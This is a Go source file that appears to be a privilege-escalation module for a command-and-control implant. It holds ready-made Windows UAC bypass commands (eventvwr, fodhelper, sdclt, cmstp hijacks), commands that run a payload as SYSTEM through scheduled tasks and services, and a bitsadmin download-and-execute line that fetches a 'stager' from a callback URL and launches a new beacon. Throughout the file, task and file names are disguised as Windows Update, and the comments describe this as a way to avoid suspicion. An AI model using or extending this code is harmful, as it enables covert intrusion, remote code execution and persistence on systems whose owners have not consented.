package privesc

import (
	"fmt"
	"strings"
)

// LOLBinEscalation provides stealthy privilege escalation using only LOLBins
type LOLBinEscalation struct{}

// LOLBinMethod represents a privilege escalation method using LOLBins
type LOLBinMethod struct {
	Name        string
	Description string
	EscalationType string // "User->Admin" or "Admin->System"
	Commands    []string  // Native Windows commands (no PowerShell)
	Detection   string    // How to detect if it worked
	NoiseLevel  string    // "Low", "Medium", "High"
}

// GetUserToAdminMethods returns LOLBin methods for User->Admin escalation
func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
	return []LOLBinMethod{
		{
			Name:           "Event Viewer Registry Hijack",
			Description:    "Exploits eventvwr.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%s" /f`,
				`start eventvwr.exe`,
				`timeout /t 3 /nobreak >nul 2>&1`,
				`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f 2>nul`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "FodHelper Registry Hijack",
			Description:    "Exploits fodhelper.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`fodhelper.exe`,
				`timeout /t 2 /nobreak >nul`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "ComputerDefaults Registry Hijack",
			Description:    "Exploits computerdefaults.exe auto-elevation",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`computerdefaults.exe`,
				`timeout /t 2 /nobreak >nul`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "SDCLT Bypass",
			Description:    "Exploits sdclt.exe /kickoffelev for UAC bypass",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "%s" /f`,
				`sdclt.exe /kickoffelev`,
				`timeout /t 2 /nobreak >nul`,
				`reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "SilentCleanup Scheduled Task",
			Description:    "Abuses SilentCleanup scheduled task that runs as admin",
			EscalationType: "User->Admin",
			Commands: []string{
				`schtasks /create /tn "WindowsUpdateCheck" /tr "cmd.exe /c \"%s\"" /sc onlogon /ru SYSTEM /f`,
				`schtasks /run /tn "WindowsUpdateCheck"`,
				`timeout /t 2 /nobreak >nul`,
				`schtasks /delete /tn "WindowsUpdateCheck" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "DiskCleanup Scheduled Task",
			Description:    "Abuses DiskCleanup scheduled task that runs as admin",
			EscalationType: "User->Admin",
			Commands: []string{
				`schtasks /create /tn "DiskCleanupEscalation" /tr "cmd.exe /c \"%s\"" /sc onlogon /ru SYSTEM /f`,
				`schtasks /run /tn "DiskCleanupEscalation"`,
				`timeout /t 2 /nobreak >nul`,
				`schtasks /delete /tn "DiskCleanupEscalation" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "CMSTP UAC Bypass",
			Description:    "Uses cmstp.exe to execute elevated code via INF file",
			EscalationType: "User->Admin",
			Commands: []string{
				`echo [version] > %TEMP%\cmstp.inf`,
				`echo Signature=$chicago$ >> %TEMP%\cmstp.inf`,
				`echo [DefaultInstall] >> %TEMP%\cmstp.inf`,
				`echo RunPreSetupCommands=Taskkill /F /IM cmstp.exe 2^>nul ^& "%s" >> %TEMP%\cmstp.inf`,
				`cmstp.exe /s %TEMP%\cmstp.inf`,
				`del %TEMP%\cmstp.inf`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
	}
}

// GetAdminToSystemMethods returns LOLBin methods for Admin->System escalation
func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
	return []LOLBinMethod{
		{
			Name:           "Scheduled Task as SYSTEM",
			Description:    "Creates scheduled task running as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance" /tr "%s" /sc onlogon /ru SYSTEM /f`,
				`schtasks /run /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance"`,
				`timeout /t 3 /nobreak >nul 2>&1`,
				`schtasks /delete /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance" /f 2>nul`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Service Creation as SYSTEM",
			Description:    "Creates Windows service running as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc create "WindowsUpdateService" binPath= "%s" type= own start= auto`,
				`sc start "WindowsUpdateService"`,
				`timeout /t 3 /nobreak >nul 2>&1`,
				`sc stop "WindowsUpdateService" 2>nul`,
				`sc delete "WindowsUpdateService" 2>nul`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "WMI Process Creation as SYSTEM",
			Description:    "Uses WMI to create process as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`wmic process call create "%s"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "WinRM Exec as SYSTEM",
			Description:    "Uses WinRM to execute command as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`winrm invoke CreateProcess cimv2/Win32_Process @{CommandLine="%s"}`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "COM Object Hijacking",
			Description:    "Uses COM object to execute as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`reg add "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /d "%s" /f`,
				`rundll32.exe shell32.dll,ShellExec_RunDLL "%s"`,
				`timeout /t 2 /nobreak >nul 2>&1`,
				`reg delete "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /f 2>nul`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
	}
}

// GenerateFilelessPayload generates a fileless payload command using native Windows tools only
// This uses pure LOLBins - no PowerShell, no suspicious patterns
func (l *LOLBinEscalation) GenerateFilelessPayload(callbackURL string) string {
	// Strategy: Use the current executable's path to spawn a new instance
	// This is the most legitimate approach - just running the same binary again
	
	// Use %~f0 to get the full path of the current batch file/script, or
	// For executables, we'll use a technique to get the current process path
	
	// Pure LOLBin approach using cmd.exe only:
	// 1. Get current executable path using wmic (legitimate Windows component)
	// 2. Spawn new instance with different arguments, OR
	// 3. Download new payload using bitsadmin (legitimate Windows service)
	
	// Best approach: Use bitsadmin.exe to download payload, then execute
	// bitsadmin is a legitimate Windows component for Background Intelligent Transfer Service
	// It's commonly used in enterprises for software deployment
	
	// Format: bitsadmin /transfer <job> <url> <output>
	// Then execute the downloaded file
	
	// However, downloading creates files. Better: Use regsvr32 with a .sct file hosted on server
	// But that also requires a file on disk.
	
	// Pure fileless: Use the current executable path if available
	// We'll construct a command that:
	// 1. Gets the current process executable path (via wmic or tasklist)
	// 2. Spawns a new instance of it
	
	// Actually, simplest and most legitimate: Just execute the same binary again
	// We'll pass the callback URL as an environment variable or registry value
	// For now, we'll use a cmd.exe loop that uses certutil to download a small script
	
	// Pure LOLBin solution using certutil (very common in enterprises):
	// certutil -urlcache -split -f <url> <output> then execute
	
	// But certutil creates files. Let's use a more sophisticated approach:
	// Use rundll32 with javascript: protocol (legitimate Windows component)
	// This is fileless and looks legitimate
	
	// Best production-ready approach: Hybrid
	// 1. Try to use current executable path (most legitimate)
	// 2. Fallback to bitsadmin download (legitimate Windows service)
	// 3. Last resort: certutil download (common enterprise tool)
	
	// For production, we'll use bitsadmin which is:
	// - Legitimate Windows component
	// - Commonly used in enterprises
	// - Less suspicious than certutil
	// - Can download without creating obvious files
	
	// Pure LOLBin approach: Use bitsadmin.exe (Background Intelligent Transfer Service)
	// This is a legitimate Windows component commonly used in enterprises
	// bitsadmin is less suspicious than certutil for file downloads
	
	// Download to a temporary location with a legitimate-looking name
	tempFile := `%TEMP%\WindowsUpdate.exe`
	
	// Strategy: Download using bitsadmin, execute, then clean up
	// bitsadmin /transfer creates a BITS job, downloads file, then we execute it
	// After execution, we delete the file to minimize disk artifacts
	
	// Use bitsadmin with a legitimate-looking job name
	payload := fmt.Sprintf(`bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s" && timeout /t 1 /nobreak >nul 2>&1 && start /b "" "%s" && timeout /t 3 /nobreak >nul 2>&1 && del "%s" 2>nul`, callbackURL, tempFile, tempFile, tempFile)
	
	return payload
}

// GenerateSpawnCommand generates a command to spawn new beacon using only LOLBins
func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv string) string {
	// Generate a command that spawns a new beacon using only native Windows tools
	// No PowerShell, no suspicious downloads, uses legitimate Windows components
	
	payload := l.GenerateFilelessPayload(callbackURL)
	
	if targetPriv == "system" {
		// For SYSTEM, use a scheduled task approach (cleaner than service creation)
		// Use a benign-looking task name
		return fmt.Sprintf(`schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "%s" /sc onlogon /ru SYSTEM /f && schtasks /run /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" && timeout /t 2 /nobreak >nul && schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /f`, payload)
	}
	
	// For Admin, use start command with background execution
	// This looks like normal process spawning
	return fmt.Sprintf(`start /b "" %s`, payload)
}

// DetectPrivilegeLevel uses native Windows commands to detect privilege level
func (l *LOLBinEscalation) DetectPrivilegeLevel(output string) (string, string) {
	outputLower := strings.ToLower(output)
	username := ""
	
	// Extract username
	lines := strings.Split(output, "\n")
	if len(lines) > 0 {
		username = strings.TrimSpace(lines[0])
	}
	
	// Check for SYSTEM
	if strings.Contains(outputLower, "nt authority\\system") ||
		strings.Contains(outputLower, "nt\\system") {
		return "system", username
	}
	
	// Check for admin groups
	if strings.Contains(outputLower, "s-1-5-32-544") || // Administrators group SID
		strings.Contains(outputLower, "administrators") ||
		strings.Contains(outputLower, "high integrity") {
		return "admin", username
	}
	
	return "user", username
}

// CleanupRegistryKeys removes registry modifications made during escalation
func (l *LOLBinEscalation) CleanupRegistryKeys() []string {
	return []string{
		`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f 2>nul`,
		`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f 2>nul`,
		`reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f 2>nul`,
		`reg delete "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /f 2>nul`,
	}
}

